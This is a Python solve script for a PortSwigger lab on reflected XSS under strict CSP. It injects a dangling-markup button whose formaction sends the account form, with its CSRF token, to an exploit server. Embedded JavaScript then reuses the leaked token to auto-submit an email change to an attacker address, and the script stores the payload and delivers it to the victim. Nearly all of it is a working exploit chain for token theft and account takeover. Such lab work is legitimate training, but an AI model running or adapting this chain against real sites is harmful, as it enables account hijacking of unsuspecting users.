#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Reflected XSS protected by very strict CSP, with dangling markup attack.

The lab's CSP has no `form-action` directive. An injected <button formaction=...
formmethod=get> inside the account form reroutes submission to the exploit
server as a GET, carrying the hidden csrf input in the query string. The
exploit server script reads the token and POSTs change-email to steal the
admin's account.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


EXPLOIT_BODY_TEMPLATE = """<body>
<script>
    const academyFrontend = "{lab}/";
    const exploitServer = "{exploit}/exploit";

    const url = new URL(location);
    const csrf = url.searchParams.get('csrf');

    if (csrf) {{
        const form = document.createElement('form');
        const email = document.createElement('input');
        const token = document.createElement('input');

        token.name = 'csrf';
        token.value = csrf;

        email.name = 'email';
        email.value = 'hacker@evil-user.net';

        form.method = 'post';
        form.action = `${{academyFrontend}}my-account/change-email`;
        form.append(email);
        form.append(token);
        document.documentElement.append(form);
        form.submit();
    }} else {{
        location = `${{academyFrontend}}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${{exploitServer}}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
    }}
</script>
</body>
"""


def post_exploit(exploit_server: str, body: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": body,
        "formAction": "STORE",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Stored exploit on server")


def deliver(exploit_server: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "formAction": "DELIVER_TO_VICTIM",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Delivered exploit to victim")


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 30: very strict CSP + formaction/formmethod dangling markup"
    )
    parser.add_argument("lab_url", help="Lab URL, e.g. https://0aXX00...web-security-academy.net")
    parser.add_argument("exploit_url", help="Exploit server URL, e.g. https://exploit-0aYY...exploit-server.net")
    parser.add_argument("--deliver", action="store_true", help="Store + DELIVER_TO_VICTIM (otherwise just prints the body)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_url.rstrip("/")

    body = EXPLOIT_BODY_TEMPLATE.format(lab=lab, exploit=exploit)
    print("[+] Exploit server body:\n")
    print(body)

    if args.deliver:
        s = requests.Session()
        s.verify = False
        post_exploit(exploit, body, s)
        deliver(exploit, s)
        r = s.get(lab)
        if "Congratulations" in r.text or "is-solved" in r.text:
            print("[+] Lab solved!")
        else:
            print("[*] Lab not yet marked solved — give the victim a few seconds and re-check.")
    else:
        print("\n[*] Paste the body into the exploit server, Store, then Deliver to Victim.")


if __name__ == "__main__":
    main()
